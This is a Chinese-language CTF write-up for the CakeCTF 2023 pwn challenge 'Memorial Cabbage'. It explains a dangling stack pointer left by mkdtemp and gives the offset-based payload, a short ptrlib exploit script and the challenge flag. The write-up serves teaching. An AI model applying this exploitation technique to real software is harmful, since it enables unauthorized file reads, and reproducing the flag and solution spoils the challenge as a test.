# Memorial Cabbage

## 题目简述

程序启动时用栈数组创建随机临时目录，随后提供“写 memo”和“读 memo”两个菜单。表面上两个函数都使用有界 `fgets`，路径数组也足以容纳 `/tmp/cabbage.XXXXXX/memo.txt`；真正的漏洞在 `setup()` 中：

```c
static char *tempdir;

void setup(void) {
    char template[] = "/tmp/cabbage.XXXXXX";

    tempdir = mkdtemp(template);
    chdir(tempdir);
}
```

`mkdtemp` 会原地修改传入数组，并返回**同一个缓冲区的指针**，不会复制字符串。`template` 却是 `setup` 的局部栈变量；函数返回后，保存到全局变量 `tempdir` 的地址已经悬空，后续函数可以复用并覆盖那一段栈。

官方二进制的栈布局使 `memo_w()` 中 `buf` 的 `0xff0` 偏移与旧 `template` 重合。长 memo 因而能够把 `tempdir` 指向位置的内容改成 `/flag.txt\0`。这是栈对象生命周期错误造成的悬空指针利用，归入 `pwn`。

## 解题过程

### 覆盖悬空的目录字符串

`memo_w()` 先把用户输入读入 `char buf[0x1000]`，之后才通过 `tempdir` 构造文件路径：

```c
fgets(buf, sizeof(buf) - 1, stdin);

strcpy(path, tempdir);
strcpy(path + strlen(TEMPDIR_TEMPLATE), "/memo.txt");
fp = fopen(path, "w");
```

输入 `b"A" * 0xff0 + b"/flag.txt\0"` 后，前面的填充占据 `buf`，尾部字符串落到已经失效、但仍由 `tempdir` 指向的旧栈槽中。此时 `strcpy(path, tempdir)` 得到 `/flag.txt\0`。

第二次 `strcpy` 的目标不是 `path + strlen(path)`，而是固定的 `path + strlen("/tmp/cabbage.XXXXXX")`，即偏移 19。它会在更后面写入 `/memo.txt`，但 `/flag.txt` 后的 NUL 仍位于偏移 9，因此 `fopen` 实际看到的路径仍然只是 `/flag.txt`。

### 为什么先写不会毁掉 flag

菜单 1 会尝试用模式 `"w"` 打开当前路径。赛事容器中的 flag 对服务用户不可写，所以 `fopen("/flag.txt", "w")` 失败，函数直接返回；flag 不会被截断。随后菜单 2 用模式 `"r"` 重新构造相同路径，成功打开 `/flag.txt` 并通过 `printf("Memo: %s", buf)` 输出内容。

这也是本地复现时最危险的坑：若测试用 flag 文件对当前用户可写，第一步会先把它清空。应使用不可写的测试文件或隔离容器，不能直接对有价值文件运行 payload。

仓库官方脚本的完整利用核心为：

```python
from ptrlib import Process

sock = Process("./cabbage")

sock.sendlineafter("> ", "1")
sock.sendlineafter("Memo: ", b"A" * 0xff0 + b"/flag.txt\0")

sock.sendlineafter("> ", "2")
sock.sh()
```

`0xff0` 不是源代码层面的数组上界，而是该构建产物中 `memo_w.buf` 到旧 `setup.template` 栈槽的实测距离。[公开调试记录](https://d0ublew.github.io/writeups/cakectf-2023/pwn/memorial-cabbage/index.html)也展示了输入前后 `tempdir` 指向内容从随机目录变成 payload 的变化。成功读取到：

```text
CakeCTF{B3_c4r3fuL_s0m3_libc_fuNcT10n5_r3TuRn_5t4ck_p01nT3r}
```

## 方法总结

- 核心技巧：利用 `mkdtemp` 返回调用者缓冲区本身这一 API 语义，让全局变量保存悬空栈指针；再通过后续大栈帧复用覆盖其内容，把固定 memo 路径改成 flag 路径。
- 识别信号：库函数返回 `char *` 后，调用者把它长期保存；传入参数却是即将离开作用域的局部数组。源码中的每一次拷贝都可能“看起来有界”，但对象生命周期已经失效。
- 复用要点：先确认 API 返回的是新分配对象还是输入缓冲区别名，再用反汇编或调试器测量跨函数栈槽复用偏移。利用写模式失败来保留目标文件依赖权限配置，本地验证必须先隔离并检查权限。
